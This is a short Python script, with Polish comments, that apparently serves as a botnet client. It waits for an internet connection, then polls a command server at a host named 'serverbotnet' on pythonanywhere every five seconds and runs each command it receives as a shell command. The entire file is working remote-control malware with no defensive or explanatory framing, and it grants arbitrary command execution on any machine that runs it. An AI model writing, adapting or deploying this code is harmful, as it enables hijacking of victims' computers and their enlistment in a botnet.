import requests
import time
import subprocess
import os

SERVER_URL = 'http://serverbotnet.pythonanywhere.com/get_command'

def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        print(result.stdout)
        if result.stderr:
            print(result.stderr)
    except Exception as e:
        print(f"Error executing command: {e}")

while True:
    try:
        # Sprawdź połączenie z internetem
        response = requests.get('https://www.google.com', timeout=5)
        if response.status_code == 200:
            # Połączenie z internetem jest aktywne
            break
    except requests.ConnectionError:
        print("Brak połączenia z internetem. Oczekiwanie...")
        time.sleep(5)

while True:
    try:
        response = requests.get(SERVER_URL)
        if response.status_code == 200:
            command = response.json().get('command')
            if command:
                execute_command(command)
    except Exception as e:
        print(f"Error connecting to server: {e}")
    time.sleep(5)
